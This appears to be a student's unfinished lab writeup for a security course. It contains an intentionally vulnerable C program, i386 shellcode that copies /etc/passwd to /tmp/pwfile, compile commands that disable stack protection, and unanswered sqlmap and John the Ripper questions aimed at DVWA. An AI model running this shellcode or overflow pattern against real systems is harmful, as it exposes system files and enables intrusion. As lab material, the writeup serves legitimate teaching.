# Lab #1,22110015, Nguyen Manh Cuong, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

## 1.Create a Vulnerable C Program

```bash
nano redundant_code.c
```
![image](https://github.com/user-attachments/assets/2e434b7b-7ddf-4675-8e55-54fbc71d3579)

Create a C program that contains a buffer overflow vulnerability

## 2.  Compile the C Program

```bash
gcc -o redundant_code redundant_code.c -fno-stack-protector -z execstack
```

## 3. Create the Assembly Payload

* Now, create an assembly program that will copy /etc/passwd to /tmp/pwfile. Here’s the assembly code

```bash
nano asm_code.c
```
![image](https://github.com/user-attachments/assets/d431ef63-ede5-4b1c-ad05-3e1ba676f77f)








```bash
gcc -g redundant_code.c -o redundant_code.out -fno-stack-protector -mpreferred-stack-boundary=2
./redundant_code.out "AAAAAAAAAAAAAAA"
./redundant_code.out "AAAAAAAAAAAAAAAAAAAAAA"
```
![image](https://github.com/user-attachments/assets/b823e414-1f98-44b3-b543-f2a5c2cd23c5)

```bash
nasm -f elf32 asm_code.asm -o asm_code.o
ld -m elf_i386 asm_code.o -o asm_code
```
![image](https://github.com/user-attachments/assets/45156517-4e64-49af-8d50-ff77915cd2be)

## 2.Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do.



**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:



